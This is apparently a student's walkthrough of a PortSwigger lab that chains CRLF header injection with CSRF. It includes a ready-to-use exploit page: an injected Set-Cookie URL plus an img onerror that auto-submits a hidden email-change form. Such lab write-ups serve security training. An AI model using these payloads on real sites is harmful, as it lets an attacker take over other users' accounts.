
# #PortSwigger 


![[Pasted image 20260509173547.png]]



### **Description**
	*Use the exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. The CSRF token is tied to a **non-session cookie** (`csrfKey`), which can be injected via a CRLF injection vulnerability.

**Credentials:**
- `wiener:peter`
- `carlos:montoya`*


The server uses:
- A **CSRF token** in the request body
- A **`csrfKey` cookie** that is tied to the token

The vulnerability is that the `csrfKey` cookie is **not strictly tied to the session**. If you can inject the victim's `csrfKey` cookie with a value you control, you can use your own CSRF token to perform actions as the victim.

Additionally, there is a **CRLF injection** vulnerability in the search functionality that allows you to set cookies.





## Solution Steps

### Step 1: Log in and Capture Requests

1. Open Burp's browser and log in as `wiener:peter`
2. Submit the **"Update email"** form
3. Capture the request in Proxy history

The request shows:
- `csrf` parameter in the body
- `csrfKey` cookie in the Cookie header

![[Pasted image 20260509222559.png]]





### Step 2: Test Cookie vs Session Binding

Send the request to Burp Repeater and test:

|Change|Result|
|---|---|
|Change session cookie|You get logged out (session invalid)|
|Change `csrfKey` cookie|CSRF token is rejected (token no longer matches)|

This suggests the `csrfKey` cookie is NOT strictly tied to the session.






### Step 3: Cross-Account Test

1. Open a **private/incognito browser window**
2. Log in as `carlos:montoya`
3. Send a fresh email change request to Burp Repeater
![[Pasted image 20260509222703.png]]

4. Swap the `csrfKey` cookie and `csrf` parameter from wiener's account into carlos's request    
![[Pasted image 20260509222815.png]]

**Observe:** The request is **accepted**! The token/cookie pair from one account works for another account.

![[Pasted image 20260509222904.png]]







### Step 4: Find CRLF Injection for Cookie Injection

Back in the original browser (wiener):
1. Perform a **search** (any term)
2. Send the search request to Burp Repeater
3. Observe that the search term gets **reflected in the `Set-Cookie` header**
![[Pasted image 20260509223352.png]]

This is a **CRLF injection** vulnerability! You can inject newline characters (`%0d%0a`) to add arbitrary headers, including `Set-Cookie`.






### Step 5: Create Cookie Injection URL

Create a URL that injects your `csrfKey` cookie into the victim's browser:

```
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

**Replace:**
- `YOUR-LAB-ID` with your lab ID
- `YOUR-KEY` with the `csrfKey` cookie value from wiener's account

**Decoded version:**
```
/?search=test\r\nSet-Cookie: csrfKey=YOUR-KEY; SameSite=None
```





### Step 6: Get Required Values from wiener's Account

From your wiener account, note:
1. **`csrfKey` cookie value** (from Cookie header)
2. **`csrf` token value** (from request body)






### Step 7: Build the Complete Exploit

Create an exploit that:
1. Injects the `csrfKey` cookie using the search vulnerability
2. Submits the email change form with your CSRF token

```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
    <input type="hidden" name="email" value="hacked@attacker.com">
</form>
```






### Step 8: Complete Exploit HTML

```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit - Token Tied to Non-Session Cookie</title>
</head>
<body>
    <!-- CRLF injection to set csrfKey cookie -->
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_CSRFKEY_COOKIE%3b%20SameSite=None" 
         onerror="document.forms[0].submit()">
    
    <!-- CSRF form to change email -->
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="csrf" value="YOUR_CSRF_TOKEN">
        <input type="hidden" name="email" value="pwned@attacker.com">
    </form>
</body>
</html>
```






### Step 9: Upload to Exploit Server

1. Go to the **exploit server**
2. Paste your exploit HTML into the **"Body"** section
3. Click **"Store"**

![[Pasted image 20260509224159.png]]





### Step 10: Test and Deliver

1. **Test on yourself first** — click "View exploit"
2. Verify your email changes (you'll need to log in again)
3. **Change the email address** to something different
4. **Get fresh values** from your wiener account (csrfKey and csrf token)
5. **Update the exploit** with fresh values
6. Click **"Deliver to victim"**

![[Pasted image 20260509224805.png]]


---

## How the Attack Works
- *For Easy to understand
```
1. Attacker (wiener) obtains csrfKey cookie and csrf token
   ↓
2. Victim (carlos) visits exploit page
   ↓
3. First, the <img> tag loads:
   https://LAB/?search=test%0d%0aSet-Cookie: csrfKey=WIENER_KEY
   ↓
4. Server reflects search term in Set-Cookie header (CRLF injection)
   → Victim's browser receives: Set-Cookie: csrfKey=WIENER_KEY
   ↓
5. onerror event triggers: document.forms[0].submit()
   ↓
6. Form submits POST request with:
   - csrf = WIENER_TOKEN (from attacker)
   - Cookie: session=CARLOS_SESSION, csrfKey=WIENER_KEY
   ↓
7. Server validates:
   - csrfKey cookie matches csrf token? YES
   - (Doesn't check if it belongs to carlos)
   ↓
8. carlos's email address changes!
```

---
